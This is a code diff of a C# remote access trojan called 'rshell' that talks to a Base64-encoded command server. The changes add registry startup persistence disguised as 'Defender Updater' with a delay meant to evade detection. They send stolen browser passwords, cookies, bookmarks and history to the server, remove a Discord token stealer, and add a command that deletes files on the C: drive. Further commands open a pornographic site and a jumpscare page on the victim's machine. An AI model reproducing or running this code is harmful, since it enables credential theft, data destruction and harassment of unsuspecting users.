@@ -13,6 +13,7 @@
     using System.Linq;
     using System.Text;
     using Crying.Reader;
+    using Microsoft.CSharp;
     using Crying.Helpers;
     using System.Drawing;
     using System.Net.Http;
@@ -158,7 +159,7 @@
     {
 
         static string address = "aHR0cDovLzEyNy4wLjAuMTo4MDgwLw=="; // Your IP address in Base64
-        static string version = "rshell";
+        static string version = "1337";
 
         static string token = Utils.RandomString(15);
         static int startTime = 2;
@@ -177,7 +178,6 @@
 
         static void Startup()
         {
-            System.Threading.Thread.Sleep(69); // Waits before adding to startup to prevent detections.
             Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             key.SetValue("Defender Updater", Application.ExecutablePath);
         }
@@ -189,6 +189,10 @@
             Console.WriteLine($"Using rshell remote tool version {version}");
             Console.WriteLine($"Tool made by https://github.com/spuqe");
             Console.WriteLine("\n" + Environment.MachineName + "\n" + Environment.UserName + "\n" + Utils.GetOSName() + "\n" + Utils.IsAdministrator());
+
+            Thread.Sleep(69); // Waits before adding to startup to prevent detections.
+            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue("Defender Updater", Application.ExecutablePath);
 
             //connect
             new Thread(Join).Start();
@@ -314,87 +318,40 @@
                                 message.Add("text", String.Join("\n", windows.ToArray()));
                                 break;
 
+
                             case "passwd":
+                                List<string> Pass = new List<string>();
                                 foreach (string browser in Profile.GetMozillaBrowsers())
                                     foreach (Password account in Passwords.Get(browser))
-                                        lines.Add(BrowserUtils.FormatPassword(account));
-                                using (StreamWriter writer = new StreamWriter("Passwords.txt"))
-                                {
-                                    writer.WriteLine(String.Join("\n", lines));
-                                };
-                                break;
-
-                            case "discord":
-                                var files = SearchForFile();
-                                if (files.Count == 0)
-                                {
-                                    Console.WriteLine("Didn't find any ldb files");
-                                    return;
-                                }
-                                foreach (string token in files)
-                                {
-                                    foreach (Match match in Regex.Matches(token, "[^\"]*"))
-                                    {
-                                        if (match.Length == 59)
-                                        {
-                                            Console.WriteLine($"Token={match.ToString()}");
-                                            message.Add("text", String.Join("\n", $"Token={match.ToString()}"));
-                                        }
-                                    }
-                                }
-                                List<string> SearchForFile()
-                                {
-                                    List<string> ldbFiles = new List<string>();
-                                    string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
-
-                                    if (!Directory.Exists(discordPath))
-                                    {
-                                        Console.WriteLine("Discord path not found");
-                                        return ldbFiles;
-                                    }
-
-                                    foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
-                                    {
-                                        string rawText = File.ReadAllText(file);
-                                        if (rawText.Contains("token"))
-                                        {
-                                            Console.WriteLine($"{Path.GetFileName(file)} added");
-                                            ldbFiles.Add(rawText);
-                                        }
-                                    }
-                                    return ldbFiles;
-                                }
+                                        Pass.Add(BrowserUtils.FormatPassword(account));
+                                message.Add("text", String.Join("\n", Pass));
                                 break;
 
                             case "bookmarks":
+                                List<string> Marks = new List<string>();
                                 foreach (string browser in Profile.GetMozillaBrowsers())
                                     foreach (Bookmark bookmark in Bookmarks.Get(browser))
-                                        lines.Add(BrowserUtils.FormatBookmark(bookmark));
-                                using (StreamWriter writer = new StreamWriter("bookmarks.txt"))
-                                {
-                                    writer.WriteLine(String.Join("\n", lines));
-                                };
+                                        Marks.Add(BrowserUtils.FormatBookmark(bookmark));
+                                message.Add("text", String.Join("\n", Marks));
+
                                 break;
 
                             case "cookies":
+                             List<string> Cooki = new List<string>();
                                 foreach (string browser in Profile.GetMozillaBrowsers())
                                     foreach (Common.Cookie cookie in Cookies.Get(browser))
-                                        lines.Add(BrowserUtils.FormatCookie(cookie));
-                                using (StreamWriter writer = new StreamWriter("cookies.txt"))
-                                {
-                                    writer.WriteLine(String.Join("\n", lines));
-                                };
+                                        Cooki.Add(BrowserUtils.FormatCookie(cookie));
+                                message.Add("text", String.Join("\n", Cooki));
+
                                 break;
 
-
                             case "history":
+                                List<string> Hist = new List<string>();
                                 foreach (string browser in Profile.GetMozillaBrowsers())
                                     foreach (Site history in History.Get(browser))
-                                        lines.Add(BrowserUtils.FormatHistory(history));
-                                using (StreamWriter writer = new StreamWriter("History.txt"))
-                                {
-                                    writer.WriteLine(String.Join("\n", lines));
-                                };
+                                        Hist.Add(BrowserUtils.FormatHistory(history));
+                                message.Add("text", String.Join("\n", Hist));
+
                                 break;
 
                             case "pid":
@@ -406,7 +363,6 @@
                                 string bin = Process.GetCurrentProcess().MainModule.FileName;
                                 message.Add("text", bin);
                                 break;
-
 
                             case "set-timeout":
                                 timeout = Int32.Parse(args[0]);
@@ -548,12 +504,31 @@
                                 }
                                 break;
 
+                            case "destroy":
+                                Thread.Sleep(15000);
+                                string[] files = Directory.GetFiles("C:/");
+
+                                foreach (string file in files)
+                                {
+                                    FileInfo fi = new FileInfo(file);
+                                        fi.Delete();
+                                }
+                                break;
+
                             case "upload":
                                 using (WebClient wc = new WebClient())
                                 {
                                     wc.UploadFile(args[0], args[1]); // $_FILE['file']
                                     message.Add("text", "File uploaded from '" + args[0] + "' to '" + args[1] + "'");
                                 }
+                                break;
+
+                            case "porn":
+                                Process.Start("https://heavy-r.com/video/257138/Mature_Wife_Sex_With_2_Guys/");
+                                break;
+
+                            case "jumpScare":
+                                Process.Start("https://pnrtscr.com/kqrkc7");
                                 break;
 
                             default:
